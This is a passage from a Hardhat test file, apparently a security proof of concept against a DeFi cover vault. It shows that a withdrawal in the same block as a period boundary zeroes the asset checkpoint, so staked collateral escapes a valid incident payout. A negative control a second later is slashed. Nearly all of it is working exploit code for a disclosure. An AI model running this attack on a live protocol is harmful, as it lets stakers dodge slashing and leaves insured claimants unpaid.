  const receiverDelta = (await ctx.vaultAsset.balanceOf(ctx.payoutReceiver.address)) - receiverBefore
  const receiverFlbDelta = (await ctx.usdc.balanceOf(ctx.payoutReceiver.address)) - receiverFlbBefore

  const [incident] = await ctx.incidentManager.getIncident(1)
  expect(incident.status).to.equal(4) // CLOSED

  const [recipientLoss, roundExists] =
    await ctx.incidentManager.getCurrentPayoutRecipientAssessmentLoss(1, ctx.payoutReceiver.address)
  expect(roundExists).to.equal(true)
  expect(recipientLoss).to.equal(ctx.requestedCover)

  return { captureTimestamp, settleBlock, receiverDelta, receiverFlbDelta, incident, recipientLoss }
}

async function claimInPeriodThree (ctx, boundary) {
  await time.increaseTo(boundary + 2n * BigInt(DAY))
  expect(await ctx.vault.currentPeriod()).to.equal(3)

  const stakerBefore = await ctx.vaultAsset.balanceOf(ctx.staker.address)
  await ctx.vault.connect(ctx.staker).claimWithdraw(2)
  return (await ctx.vaultAsset.balanceOf(ctx.staker.address)) - stakerBefore
}

describe('Security PoC: period-start checkpoint can be rewritten after cover is committed', function () {
  it('same-boundary-block withdrawal escapes collateral from a later valid incident payout', async function () {
    const ctx = await deployProductionPath()
    const boundaryState = await commitAtBoundaryAndWithdraw(ctx, 0)

    // commitAllocation observed 200 units at this exact period-start timestamp.
    // The later transaction in the same block writes the timestamp checkpoint to
    // zero, changing the historical value used by payout while preserving the
    // already committed allocation.
    expect(await ctx.vault.totalAssetsAt(boundaryState.boundary - 1n)).to.equal(ctx.stakedAssets)
    expect(await ctx.vault.totalAssetsAt(boundaryState.boundary)).to.equal(0)

    const payout = await payValidIncident(ctx, boundaryState)
    expect(payout.receiverFlbDelta).to.equal(ctx.firstLossBufferAssets)
    expect(payout.receiverDelta).to.equal(0)
    expect(payout.incident.vaultPaidAmount).to.equal(0)
    expect(await ctx.vault.withdrawAssets(2)).to.equal(ctx.stakedAssets)

    const stakerClaimDelta = await claimInPeriodThree(ctx, boundaryState.boundary)
    expect(stakerClaimDelta).to.equal(ctx.stakedAssets)

    console.log('attackBoundaryTimestamp=', boundaryState.boundary.toString())
    console.log('attackCommitBlock=', boundaryState.commitReceipt.blockNumber)
    console.log('attackCommitTxIndex=', boundaryState.commitReceipt.index)
    console.log('attackSettlementTxIndex=', boundaryState.settleReceipt.index)
    console.log('attackWithdrawTxIndex=', boundaryState.withdrawReceipt.index)
    console.log('attackWithdrawalTimestamp=', (await ethers.provider.getBlock(boundaryState.withdrawReceipt.blockNumber)).timestamp)
    console.log('attackCaptureTimestamp=', payout.captureTimestamp)
    console.log('attackStartCheckpointBefore=', ctx.stakedAssets.toString())
    console.log('attackStartCheckpointAfter=', (await ctx.vault.totalAssetsAt(boundaryState.boundary)).toString())
    console.log('attackValidAssessmentVaultPayout=', payout.receiverDelta.toString())
    console.log('attackValidAssessmentFLBPayout=', payout.receiverFlbDelta.toString())
    console.log('attackEscapedWithdrawalClaim=', stakerClaimDelta.toString())
  })

  it('negative control: withdrawal at boundary + 1 preserves the snapshot and is slashed', async function () {
    const ctx = await deployProductionPath()
    const boundaryState = await commitAtBoundaryAndWithdraw(ctx, 1)

    expect(await ctx.vault.totalAssetsAt(boundaryState.boundary)).to.equal(ctx.stakedAssets)
    expect(await ctx.vault.totalAssetsAt(boundaryState.boundary + 1n)).to.equal(0)

    const payout = await payValidIncident(ctx, boundaryState)
    expect(payout.receiverFlbDelta).to.equal(ctx.firstLossBufferAssets)
    expect(payout.receiverDelta).to.equal(e6('75'))
    expect(payout.incident.vaultPaidAmount).to.equal(e6('75'))
    expect(await ctx.vault.withdrawAssets(2)).to.equal(e6('125'))

    const stakerClaimDelta = await claimInPeriodThree(ctx, boundaryState.boundary)
    expect(stakerClaimDelta).to.equal(e6('125'))

    console.log('controlBoundaryTimestamp=', boundaryState.boundary.toString())
    console.log('controlWithdrawalTimestamp=', (await ethers.provider.getBlock(boundaryState.withdrawReceipt.blockNumber)).timestamp)
    console.log('controlCaptureTimestamp=', payout.captureTimestamp)
    console.log('controlStartCheckpoint=', (await ctx.vault.totalAssetsAt(boundaryState.boundary)).toString())
    console.log('controlValidAssessmentVaultPayout=', payout.receiverDelta.toString())
    console.log('controlValidAssessmentFLBPayout=', payout.receiverFlbDelta.toString())
    console.log('controlSlashedWithdrawalClaim=', stakerClaimDelta.toString())
  })
})
```
